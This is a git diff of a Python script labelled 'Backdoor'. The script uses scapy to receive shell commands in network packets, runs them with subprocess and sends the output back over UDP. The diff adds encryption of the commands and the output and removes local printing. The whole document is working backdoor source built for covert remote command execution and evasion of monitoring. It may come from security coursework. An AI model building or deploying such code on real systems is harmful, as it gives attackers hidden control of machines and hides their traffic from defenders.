@@ -2,6 +2,7 @@ import argparse, setproctitle, subprocess
 from scapy.all import *
 from scapy.layers.inet import IP, UDP
 from time import sleep
+from crypto import *
 
 parser = argparse.ArgumentParser(description="Backdoor")
 # parser.add_argument('-d', '--server_ip', dest='server_ip', help='Server IP', required=True)
@@ -13,11 +14,13 @@ args = parser.parse_args()
 
 def parse_command(packet):
     payload = packet['Raw'].load
+    payload = decrypt(payload)
     command = payload.split('#')[0]
     client_ip = payload.split('#')[1]
     proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     output = proc.stdout.read() + "\n" + proc.stderr.read()
-    print (output)
+    output = encrypt(output)
+    #print (output)
     # pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(dport=int(args.client_port), sport=int(args.server_port)))
     sleep(1) #try giving the client time to recevie.
     pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(sport=int(args.server_port), dport=int(args.client_port))/output
